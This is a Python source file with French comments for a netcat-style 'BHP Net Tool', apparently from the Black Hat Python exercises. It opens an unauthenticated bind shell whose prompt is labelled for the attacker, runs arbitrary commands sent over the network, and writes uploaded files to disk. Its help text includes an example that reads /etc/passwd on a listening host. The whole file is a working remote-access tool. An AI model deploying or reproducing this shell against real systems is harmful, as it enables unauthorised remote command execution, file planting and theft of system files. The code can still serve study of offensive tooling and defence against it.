import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    """
    Exécute une commande sur le système local et renvoie le résultat.
    """
    cmd = cmd.strip()
    if not cmd:
        return
    # check_output lance la commande et capture la sortie
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return f"Failed to execute command: {e}"

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # Création de l'objet socket TCP
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        """Point d'entrée principal : gère le mode écoute ou le mode envoi."""
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        """Mode Client : Se connecte à la cible, envoie le buffer initial et entre en boucle interactive."""
        # Connexion à la cible
        self.socket.connect((self.args.target, self.args.port))

        # Si un buffer a été fourni (via stdin), on l'envoie d'abord
        if self.buffer:
            self.socket.send(self.buffer)

        # Boucle principale pour recevoir et envoyer des données
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                
                if response:
                    print(response)
                    # On attend une entrée de l'utilisateur pour répondre
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        """Mode Serveur : Écoute sur un port et gère les nouvelles connexions."""
        print(f'[*] Listening on {self.args.target}:{self.args.port}')
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            # Pour chaque client, on lance un thread séparé
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        """Gère la logique une fois connecté : Exécution, Upload ou Shell."""
        
        # 1. Si on doit exécuter une commande unique (-e)
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # 2. Si on doit uploader un fichier (-u)
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        # 3. Si on doit ouvrir un shell de commande (-c)
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    # On affiche un prompt pour l'attaquant
                    client_socket.send(b'BHP: #> ')
                    
                    # On attend de recevoir une commande complète (terminée par \n)
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    
                    # On exécute la commande reçue
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    # Configuration des arguments de la ligne de commande
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 5555 # echo text to server port 5555
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
        '''))
    
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    
    args = parser.parse_args()

    # Si on écoute, le buffer est vide au départ
    if args.listen:
        buffer = ''
    else:
        # Si on est client, on peut lire depuis stdin (ex: echo "hello" | python netcat.py ...)
        # On utilise sys.stdin.read() seulement s'il y a des données à lire pour ne pas bloquer
        buffer = sys.stdin.read() if not sys.stdin.isatty() else ''

    # Lancement de l'outil
    nc = NetCat(args, buffer.encode())
    nc.run()

